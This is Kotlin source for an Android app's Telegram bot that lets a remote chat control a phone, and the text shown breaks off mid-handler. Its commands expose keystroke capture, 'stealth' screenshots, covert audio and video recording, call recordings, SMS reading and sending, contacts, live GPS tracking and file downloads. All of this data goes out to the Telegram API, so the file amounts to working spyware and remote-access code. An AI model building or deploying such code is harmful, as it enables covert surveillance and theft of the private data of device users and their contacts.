package com.ismartcoding.plain.telegram

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.graphics.ImageFormat
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.CallLog
import com.ismartcoding.lib.helpers.CoroutinesHelper.coIO
import com.ismartcoding.lib.logcat.LogCat
import com.ismartcoding.plain.MainApp
import com.ismartcoding.plain.data.DCall
import com.ismartcoding.plain.data.DContact
import com.ismartcoding.plain.data.DNotification
import com.ismartcoding.plain.features.PackageHelper
import com.ismartcoding.plain.features.NoteHelper
import com.ismartcoding.plain.features.BookmarkHelper
import com.ismartcoding.plain.features.feed.FeedHelper
import com.ismartcoding.plain.features.feed.FeedEntryHelper
import com.ismartcoding.plain.features.file.FileSortBy
import com.ismartcoding.plain.features.media.CallMediaStoreHelper
import com.ismartcoding.plain.features.media.ContactMediaStoreHelper
import com.ismartcoding.plain.features.media.AudioMediaStoreHelper
import com.ismartcoding.plain.features.media.VideoMediaStoreHelper
import com.ismartcoding.plain.features.media.ImageMediaStoreHelper
import com.ismartcoding.plain.features.sms.SmsConversationHelper
import com.ismartcoding.plain.features.sms.SmsHelper
import com.ismartcoding.plain.helpers.AppLauncherHelper
import com.ismartcoding.plain.helpers.BatteryHistoryHelper
import com.ismartcoding.plain.helpers.CallRecorderHelper
import com.ismartcoding.plain.helpers.AutomationHelper
import com.ismartcoding.plain.helpers.KeystrokeLogHelper
import com.ismartcoding.plain.helpers.LocationTrackingHelper
import com.ismartcoding.plain.helpers.NetworkUsageHelper
import com.ismartcoding.plain.helpers.PhoneHelper
import com.ismartcoding.plain.helpers.StealthScreenshotCapturer
import com.ismartcoding.plain.helpers.StealthScreenshotHelper
import com.ismartcoding.plain.helpers.UtilitiesHelper
import com.ismartcoding.plain.helpers.WifiControlHelper
import com.ismartcoding.plain.events.HttpApiEvents
import com.ismartcoding.lib.channel.sendEvent
import com.ismartcoding.plain.preferences.PomodoroSettingsPreference
import com.ismartcoding.plain.features.Permission
import com.ismartcoding.plain.services.AppBlockHelper
import com.ismartcoding.plain.services.LiveCallTracker
import com.ismartcoding.plain.services.LocateRingService
import com.ismartcoding.plain.services.MessageOverlayService
import com.ismartcoding.plain.services.NotificationLogHelper
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlin.coroutines.resume
import kotlin.math.min

object TelegramBotManager {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var heartbeatJob: Job? = null

    @Volatile var token: String = ""
    @Volatile var chatId: String = ""
    @Volatile var isRunning: Boolean = false
    @Volatile var forwardNotifications: Boolean = true
    @Volatile var forwardCalls: Boolean = true
    @Volatile private var lastUpdateId: Long = 0L
    @Volatile private var lastForwardedCallState: String = "idle"

    private val ts get() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

    private val allCommands = listOf(
        "start" to "👋 Welcome & device status",
        "help" to "📖 Help & all commands",
        "messages" to "💬 SMS conversations — tap one to open",
        "sms" to "📨 Open a thread — /sms <thread_id>",
        "sendsms" to "📤 Send SMS — /sendsms <number> <text>",
        "calls" to "📞 Recent call log",
        "recordings" to "🎙️ Call recordings — tap to download",
        "contacts" to "👥 Browse contacts — tap to call, SMS, or share",
        "notifications" to "🔔 Recent notifications",
        "logs" to "📋 Notification log history",
        "files" to "📁 Browse storage — tap folders to open, files to download",
        "screenshot" to "📸 Take a screenshot",
        "photo" to "📷 Camera photo — /photo [front|back]",
        "audio" to "🎙 Record audio — interactive duration picker",
        "video" to "🎬 Record video — pick camera, then duration",
        "apps" to "📱 List installed apps",
        "blockapp" to "🚫 Block an app — interactive picker",
        "unblockapp" to "✅ Unblock an app — interactive picker",
        "blockedapps" to "📵 Show all blocked & limited apps",
        "location" to "📍 Current GPS location",
        "battery" to "🔋 Battery status",
        "device" to "📲 Device information",
        "track" to "🛰 Tracking hub overview",
        "livelocation" to "🗺 Live location stream — /livelocation [n]",
        "tracklocation" to "🧭 Recent location points — /tracklocation [n]",
        "keystrokes" to "⌨️ Captured keystrokes — /keystrokes [n]",
        "keytop" to "📊 Top apps by keystroke count",
        "shots" to "🖼 Recent stealth screenshots — /shots [n]",
        "permissions" to "🛡 Status of every app permission",
        "automations" to "⚙️ List automation rules",
        "runrule" to "▶️ Run an automation — /runrule <id>",
        "togglerule" to "🔁 Enable/disable a rule — /togglerule <id>",
        "notes" to "📝 Browse notes — /notes [search]",
        "addnote" to "➕ Create a new note (interactive)",
        "bookmarks" to "🔖 Browse bookmarks — /bookmarks [search]",
        "addbookmark" to "🔗 Add a bookmark — /addbookmark <url>",
        "feeds" to "📡 RSS feeds — tap to view recent entries",
        "feedentries" to "📰 Recent feed entries — /feedentries [search]",
        "music" to "🎵 Music library — tap to download",
        "videos" to "🎞 Video library — tap to download",
        "images" to "🖼 Image gallery — tap to send",
        "pomodoro" to "🍅 Pomodoro — start/pause/stop/status",
        "torch" to "🔦 Flashlight — /torch [on|off]",
        "speak" to "🗣 Text-to-speech — /speak <text>",
        "vibrate" to "📳 Vibrate device — /vibrate [seconds]",
        "findphone" to "🚨 Locate phone with alarm — /findphone [on|off]",
        "show" to "💡 Show banner on device — /show <text>",
        "wake" to "📺 Wake screen — /wake [seconds]",
        "brightness" to "🔆 Screen brightness — /brightness [0-100]",
        "volume" to "🔊 Volume — /volume [stream] [0-100]",
        "launch" to "🚀 Launch any app — /launch <pkg|name>",
        "wifi" to "📶 Wi-Fi state / toggle — /wifi [on|off]",
        "netusage" to "📊 Network usage — /netusage [days]",
        "commands" to "📝 List all commands with details",
        "stop" to "⛔ Stop the bot",
    )

    fun start(newToken: String, newChatId: String) {
        if (newToken.isBlank() || newChatId.isBlank()) return
        token = newToken
        chatId = newChatId
        if (isRunning) return
        isRunning = true
        launchPollJob(greet = true)
        heartbeatJob?.cancel()
        heartbeatJob = scope.launch {
            while (isRunning) {
                delay(30_000)
                if (isRunning && pollJob?.isActive != true) {
                    LogCat.w("TelegramBot: poll job died — restarting")
                    launchPollJob(greet = false)
                }
            }
        }
        LogCat.d("TelegramBotManager started")
    }

    private fun launchPollJob(greet: Boolean) {
        pollJob?.cancel()
        pollJob = scope.launch {
            if (greet) {
                registerCommands()
                sendMessage("🟢 <b>PlainApp Bot started</b> — ${ts}\n📱 <i>${PhoneHelper.getDeviceName(MainApp.instance)}</i>\n\nType /help for all commands.")
            }
            poll()
        }
    }

    fun stop() {
        isRunning = false
        lastForwardedCallState = "idle"
        heartbeatJob?.cancel()
        heartbeatJob = null
        pollJob?.cancel()
        pollJob = null
        LogCat.d("TelegramBotManager stopped")
    }

    fun sendMessage(text: String, replyMarkup: JSONObject? = null) {
        if (token.isBlank() || chatId.isBlank()) return
        scope.launch {
            TelegramApiClient.sendMessage(token, chatId, text, replyMarkup = replyMarkup)
        }
    }

    fun forwardNotification(n: DNotification) {
        if (!isRunning || !forwardNotifications) return
        val txt = buildString {
            append("🔔 <b>New notification</b>\n")
            append("📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) append("📌 <b>${htmlEsc(n.title)}</b>\n")
            if (!n.body.isNullOrBlank()) append("💬 ${htmlEsc(n.body)}\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallState(state: String, display: String, source: String, direction: String) {
        if (!isRunning || !forwardCalls) return
        if (state == lastForwardedCallState) return
        lastForwardedCallState = state
        val emoji = when (state) {
            "ringing" -> if (direction == "incoming") "📲" else "📞"
            "active" -> "✅"
            "ended" -> "🔴"
            else -> return
        }
        val stateLabel = when (state) {
            "ringing" -> if (direction == "incoming") "Incoming call" else "Outgoing call"
            "active" -> "Call connected"
            "ended" -> "Call ended"
            else -> return
        }
        val txt = buildString {
            append("$emoji <b>$stateLabel</b>\n")
            if (display.isNotBlank()) append("📱 <code>${htmlEsc(display)}</code>\n")
            if (source != "phone") append("📡 via <i>${htmlEsc(source)}</i>\n")
            append("🕐 <i>${ts}</i>")
        }
        sendMessage(txt)
    }

    fun forwardCallRecording(file: File, meta: CallRecorderHelper.Meta) {
        if (!isRunning || token.isBlank() || chatId.isBlank()) return
        scope.launch {
            try {
                val durSec = (meta.durationMs / 1000).toInt().coerceAtLeast(1)
                val dirEmoji = if (meta.direction == "incoming") "📲" else "📞"
                val dur = formatDuration(meta.durationMs)
                val caption = buildString {
                    append("$dirEmoji <b>Call Recording</b>\n")
                    if (meta.displayName.isNotBlank()) append("👤 <code>${htmlEsc(meta.displayName)}</code>\n")
                    append("📡 ${htmlEsc(meta.source)}")
                    if (meta.appName.isNotBlank() && meta.appName != meta.source) append(" · ${htmlEsc(meta.appName)}")
                    append("\n")
                    append("⏱ <i>$dur</i>  📦 ${meta.sizeBytes / 1024} KB\n")
                    append("🕐 <i>${ts}</i>")
                }
                TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
            } catch (e: Exception) {
                LogCat.e("TelegramBot forwardCallRecording failed: ${e.message}")
            }
        }
    }

    fun sendCrashReport(throwable: Throwable, timestamp: String) {
        val t = token
        val c = chatId
        if (t.isBlank() || c.isBlank()) return
        try {
            val sw = java.io.StringWriter()
            throwable.printStackTrace(java.io.PrintWriter(sw))
            val stackTrace = sw.toString()
            val appVersion = try { MainApp.getAppVersion() } catch (_: Throwable) { "?" }
            val msg = buildString {
                append("🚨 <b>PlainApp Crashed!</b>\n")
                append("⏰ <code>$timestamp</code>\n")
                append("📱 <code>${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}</code>\n")
                append("🤖 Android <code>${android.os.Build.VERSION.RELEASE}</code>  App <code>$appVersion</code>\n\n")
                val lines = stackTrace.lines()
                val preview = lines.take(20).joinToString("\n")
                append("<pre>${htmlEsc(preview)}</pre>")
                if (lines.size > 20) append("\n<i>…${lines.size - 20} more lines (see crash_report.txt)</i>")
            }
            TelegramApiClient.sendMessage(t, c, msg.take(4096))
        } catch (_: Throwable) {}
    }

    private fun formatDuration(ms: Long): String {
        val totalSec = ms / 1000
        val h = totalSec / 3600
        val m = (totalSec % 3600) / 60
        val s = totalSec % 60
        return if (h > 0) "%d:%02d:%02d".format(h, m, s) else "%d:%02d".format(m, s)
    }

    private suspend fun poll() {
        while (isRunning) {
            try {
                val result = withContext(Dispatchers.IO) {
                    TelegramApiClient.getUpdates(token, lastUpdateId + 1, 25)
                }
                if (result == null) { delay(5000); continue }
                if (!result.optBoolean("ok", false)) { delay(5000); continue }
                val updates = result.optJSONArray("result") ?: continue
                for (i in 0 until updates.length()) {
                    val update = updates.getJSONObject(i)
                    val updateId = update.optLong("update_id", 0L)
                    if (updateId > lastUpdateId) lastUpdateId = updateId
                    handleUpdate(update)
                }
            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                LogCat.e("TelegramBot poll error: ${e.message}")
                delay(5000)
            }
        }
    }

    private suspend fun handleUpdate(update: JSONObject) {
        update.optJSONObject("callback_query")?.let { cq ->
            handleCallback(cq)
            return
        }
        val msg = update.optJSONObject("message") ?: return
        val fromChatId = msg.optJSONObject("chat")?.optLong("id")?.toString() ?: return
        if (fromChatId != chatId) {
            TelegramApiClient.sendMessage(token, fromChatId, "⛔ Unauthorized. This bot is private.")
            return
        }
        val text = msg.optString("text", "").trim()
        if (text.isEmpty()) return

        // If we're waiting for a free-form reply (e.g. "type custom duration"), consume it
        // unless the user explicitly sends a new command.
        val pi = pendingInput
        if (pi != null && !text.startsWith("/")) {
            pendingInput = null
            scope.launch { consumePendingInput(pi, text) }
            return
        }
        // Sending any /command cancels a pending input.
        if (text.startsWith("/")) pendingInput = null

        val parts = text.split(" ")
        val command = parts[0].lowercase().trimStart('/')
            .substringBefore("@")
        val args = parts.drop(1)
        scope.launch {
            try {
                when (command) {
                    "start" -> cmdStart()
                    "help" -> cmdHelp()
                    "messages" -> cmdMessages(args)
                    "sms" -> cmdSmsThread(args)
                    "sendsms" -> cmdSendSms(args)
                    "calls" -> cmdCalls(args)
                    "recordings" -> cmdRecordings(args)
                    "contacts" -> cmdContacts(args)
                    "notifications" -> cmdNotifications(args)
                    "logs" -> cmdLogs(args)
                    "files" -> cmdFiles(args)
                    "screenshot" -> cmdScreenshot()
                    "photo" -> cmdPhoto(args)
                    "audio" -> cmdAudio(args)
                    "video" -> cmdVideo(args)
                    "apps" -> cmdApps(args)
                    "blockapp" -> cmdBlockApp(args)
                    "unblockapp" -> cmdUnblockApp(args)
                    "blockedapps" -> cmdBlockedApps()
                    "location" -> cmdLocation()
                    "battery" -> cmdBattery()
                    "device" -> cmdDevice()
                    "track" -> cmdTrackHub()
                    "livelocation", "live" -> cmdLiveLocation(args)
                    "tracklocation", "trackloc" -> cmdTrackLocation(args)
                    "keystrokes", "keys" -> cmdKeystrokes(args)
                    "keytop" -> cmdKeyTop()
                    "shots", "screenshots" -> cmdShots(args)
                    "permissions", "perms" -> cmdPermissions()
                    "automations", "rules" -> cmdAutomations()
                    "runrule" -> cmdRunRule(args)
                    "togglerule" -> cmdToggleRule(args)
                    "notes" -> cmdNotes(args)
                    "addnote" -> cmdAddNote()
                    "bookmarks" -> cmdBookmarks(args)
                    "addbookmark" -> cmdAddBookmark(args)
                    "feeds" -> cmdFeeds()
                    "feedentries", "feedentry" -> cmdFeedEntries(args)
                    "music", "audios" -> cmdMusic(args)
                    "videos", "vidlib" -> cmdVideoLibrary(args)
                    "images", "gallery" -> cmdImages(args)
                    "pomodoro", "pom" -> cmdPomodoro(args)
                    "torch", "flashlight" -> cmdTorch(args)
                    "speak", "tts" -> cmdSpeak(text.removePrefix(parts[0]).trim())
                    "vibrate" -> cmdVibrate(args)
                    "findphone", "ringphone" -> cmdFindPhone(args)
                    "show", "banner" -> cmdShow(text.removePrefix(parts[0]).trim())
                    "wake", "wakescreen" -> cmdWake(args)
                    "brightness", "bright" -> cmdBrightness(args)
                    "volume", "vol" -> cmdVolume(args)
                    "launch", "open" -> cmdLaunch(args)
                    "wifi" -> cmdWifi(args)
                    "netusage", "datausage" -> cmdNetUsage(args)
                    "commands" -> cmdCommands()
                    "stop" -> { sendMessage("⛔ Bot stopped. Restart it from the PlainApp settings."); stop() }
                    else -> sendMessage("❓ Unknown command: <code>$command</code>\n\nSend /help for all commands.")
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot cmd $command error: ${e.message}")
                sendMessage("❌ Error running /$command: ${htmlEsc(e.message ?: "unknown")}")
            }
        }
    }

    private suspend fun handleCallback(cq: JSONObject) {
        val cqId = cq.optString("id", "")
        val fromChatId = cq.optJSONObject("message")?.optJSONObject("chat")?.optLong("id")?.toString()
        if (fromChatId != chatId) {
            if (cqId.isNotEmpty()) TelegramApiClient.answerCallbackQuery(token, cqId, "⛔ Unauthorized", true)
            return
        }
        val messageId = cq.optJSONObject("message")?.optLong("message_id", 0L) ?: 0L
        val data = cq.optString("data", "")
        if (data.isEmpty()) { if (cqId.isNotEmpty()) TelegramApiClient.answerCallbackQuery(token, cqId); return }

        val colon = data.indexOf(':')
        val key = if (colon < 0) data else data.substring(0, colon)
        val rest = if (colon < 0) "" else data.substring(colon + 1)

        scope.launch {
            try {
                when (key) {
                    "sms_open" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading thread…")
                        renderSmsThreadPage(rest.filter { it.isDigit() }, offset = 0, editMessageId = null)
                    }
                    "sms_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val tid = rest.substring(0, sep).filter { it.isDigit() }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderSmsThreadPage(tid, off, editMessageId = messageId)
                    }
                    "calls_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderCallsPage(off, editMessageId = messageId)
                    }
                    "aud" -> {
                        if (rest == "custom") {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "audio_duration"
                            TelegramApiClient.editMessageText(
                                token, chatId, messageId,
                                "🎙 <b>Custom audio duration</b>\n\nReply with the number of <b>seconds</b> to record (1–300).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
                            )
                        } else {
                            val n = rest.toIntOrNull()?.coerceIn(1, 300) ?: 10
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
                            TelegramApiClient.editMessageText(token, chatId, messageId, "🎙 Recording <b>${n}s</b> of audio…")
                            runAudioRecording(n)
                        }
                    }
                    "vid_cam" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        showVideoDurationMenu(useFront = rest == "front", editMessageId = messageId)
                    }
                    "vid_cam_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        showVideoCameraMenu(editMessageId = messageId)
                    }
                    "vid_custom" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "video_duration:${if (rest == "front") "front" else "back"}"
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🎬 <b>Custom video duration</b> · ${if (rest == "front") "🤳 Front" else "📷 Back"} camera\n\nReply with the number of <b>seconds</b> to record (1–120).\n\nFormat: just the number, e.g. <code>45</code>.\nSend any /command to cancel."
                        )
                    }
                    "vid" -> {
                        // rest = "<cam>:<seconds>"
                        val sep = rest.indexOf(':')
                        if (sep < 0) { TelegramApiClient.answerCallbackQuery(token, cqId); return@launch }
                        val cam = rest.substring(0, sep)
                        val n = rest.substring(sep + 1).toIntOrNull()?.coerceIn(1, 120) ?: 10
                        val useFront = cam == "front"
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Recording ${n}s…")
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🎬 Recording <b>${n}s</b> · ${if (useFront) "🤳 Front" else "📷 Back"} camera…"
                        )
                        runVideoRecording(n, useFront)
                    }
                    "rec_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending recording…")
                        cbSendRecording(rest)
                    }
                    "contacts_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderContactsPage(q, off, editMessageId = messageId)
                    }
                    "c_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        // rest = "<rawId>:<q>:<offset>" — we only need rawId; the back state is tracked globally.
                        val rawId = rest.substringBefore(':')
                        renderContactDetail(rawId, editMessageId = messageId)
                    }
                    "c_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderContactsPage(lastContactsQuery, lastContactsOffset, editMessageId = messageId)
                    }
                    "c_call" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            try {
                                CallMediaStoreHelper.call(MainApp.instance, num)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "📞 Calling $num…")
                                sendMessage("📞 Placing call to <code>${htmlEsc(num)}</code> on the device.\n<i>If nothing happens, grant the Phone (CALL_PHONE) permission in PlainApp.</i>")
                            } catch (e: Exception) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true)
                                sendMessage("❌ Could not place call: ${htmlEsc(e.message ?: "")}")
                            }
                        }
                    }
                    "c_sms" -> {
                        val num = phoneFromToken(rest)
                        if (num == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Number expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId)
                            pendingInput = "sms_to:${phoneToken(num)}"
                            sendMessage("💬 <b>Send SMS to <code>${htmlEsc(num)}</code></b>\n\nReply with the message text.\nSend any /command to cancel.")
                        }
                    }
                    "c_share" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sharing contact…")
                        cbShareContact(rest)
                    }
                    "block_list" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderAppPickerForBlock(query = "", offset = off, editMessageId = messageId)
                    }
                    "block_pick" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBlockActionMenu(rest, messageId)
                    }
                    "block_now" -> {
                        AppBlockHelper.setBlocked(rest, true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Blocked", false)
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "🚫 <b>${htmlEsc(rest)}</b> is now blocked.\n\nUse /unblockapp or tap below.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("✅ Unblock now" to "unblock:${rest.take(55)}")))
                        )
                    }
                    "block_lim" -> {
                        val parts = rest.split(":")
                        if (parts.size < 2) return@launch
                        val pkg = parts[0]
                        val mins = parts[1].toIntOrNull() ?: 0
                        AppBlockHelper.setTimeLimit(pkg, mins * 60_000L)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Limit set to ${mins} min/day")
                        TelegramApiClient.editMessageText(
                            token, chatId, messageId,
                            "⏱ <b>${htmlEsc(pkg)}</b> limited to <b>${mins} min/day</b>.\nIt will be blocked once today's usage exceeds the limit.",
                            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("✕ Clear limit" to "limit_clr:${pkg.take(50)}")))
                        )
                    }
                    "limit_clr" -> {
                        AppBlockHelper.setTimeLimit(rest, 0L)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Limit cleared")
                        renderUnblockPicker(editMessageId = messageId)
                    }
                    "unblock" -> {
                        AppBlockHelper.setBlocked(rest, false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Unblocked")
                        renderUnblockPicker(editMessageId = messageId)
                    }
                    "files_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val tok = rest.substring(0, sep)
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        val path = pathFromToken(tok)
                        if (path == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
                        } else {
                            renderFolderPage(path, off, editMessageId = messageId)
                        }
                    }
                    "file_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val path = pathFromToken(rest)
                        if (path == null) {
                            TelegramApiClient.editMessageText(token, chatId, messageId, "⚠️ Path session expired. Send /files to start over.")
                        } else {
                            renderFileView(path, editMessageId = messageId)
                        }
                    }
                    "file_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Uploading file…")
                        val path = pathFromToken(rest)
                        if (path == null) {
                            sendMessage("⚠️ Path session expired. Send /files to start over.")
                        } else {
                            cbSendFile(path)
                        }
                    }
                    // ---- Notes ----
                    "notes_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderNotesPage(q, off, editMessageId = messageId)
                    }
                    "note_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading note…")
                        renderNoteDetail(rest, editMessageId = messageId)
                    }
                    "note_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
                    }
                    "note_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        TelegramApiClient.editMessageReplyMarkup(
                            token, chatId, messageId,
                            TelegramApiClient.inlineKeyboard(listOf(
                                listOf("✅ Yes, trash it" to "note_del_ok:$rest", "✕ Cancel" to "note_view:$rest"),
                                listOf("⬅️ Back to list" to "note_back"),
                            ))
                        )
                    }
                    "note_del_ok" -> {
                        try {
                            NoteHelper.trashAsync(setOf(rest))
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Note trashed")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                        renderNotesPage(lastNotesQuery, lastNotesOffset, editMessageId = messageId)
                    }
                    // ---- Bookmarks ----
                    "bm_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderBookmarksPage(q, off, editMessageId = messageId)
                    }
                    "bm_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBookmarkDetail(rest, editMessageId = messageId)
                    }
                    "bm_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
                    }
                    "bm_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        TelegramApiClient.editMessageReplyMarkup(
                            token, chatId, messageId,
                            TelegramApiClient.inlineKeyboard(listOf(
                                listOf("✅ Yes, delete" to "bm_del_ok:$rest", "✕ Cancel" to "bm_view:$rest"),
                            ))
                        )
                    }
                    "bm_del_ok" -> {
                        try {
                            BookmarkHelper.deleteBookmarks(setOf(rest), MainApp.instance)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Bookmark deleted")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                        renderBookmarksPage(lastBookmarksQuery, lastBookmarksOffset, editMessageId = messageId)
                    }
                    "bm_open" -> {
                        try {
                            val bm = BookmarkHelper.getById(rest)
                            if (bm == null) { TelegramApiClient.answerCallbackQuery(token, cqId, "Not found", true); return@launch }
                            BookmarkHelper.recordClick(rest)
                            val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(bm.url))
                            intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            MainApp.instance.startActivity(intent)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🌐 Opened on device")
                        } catch (e: Exception) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Failed: ${e.message?.take(60)}", true)
                        }
                    }
                    // ---- Feeds ----
                    "feed_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entries…")
                        renderFeedEntriesPage(rest, 0, editMessageId = messageId)
                    }
                    "feeds_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderFeedsList(editMessageId = messageId)
                    }
                    "fe_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val feedId = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderFeedEntriesPage(feedId, off, editMessageId = messageId)
                    }
                    "fe_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading entry…")
                        renderFeedEntryDetail(rest, editMessageId = messageId)
                    }
                    "fe_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val feedId = if (sep < 0) rest else rest.substring(0, sep)
                        val off = if (sep < 0) 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderFeedEntriesPage(if (feedId == "_") "" else feedId, off, editMessageId = messageId)
                    }
                    // ---- Music / videos / images ----
                    "mus_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderMusicPage(q, off, editMessageId = messageId)
                    }
                    "mus_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending audio…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Track session expired. Send /music again.")
                        else cbSendMediaAudio(path)
                    }
                    "vds_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderVideosPage(q, off, editMessageId = messageId)
                    }
                    "vds_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending video…")
                        val path = pathFromToken(rest)
                        if (path == null) sendMessage("⚠️ Video session expired. Send /videos again.")
                        else cbSendMediaVideo(path)
                    }
                    "img_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderImagesPage(q, off, editMessageId = messageId)
                    }
                    "img_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending photo…")
                        val path = pathFromToken(rest)
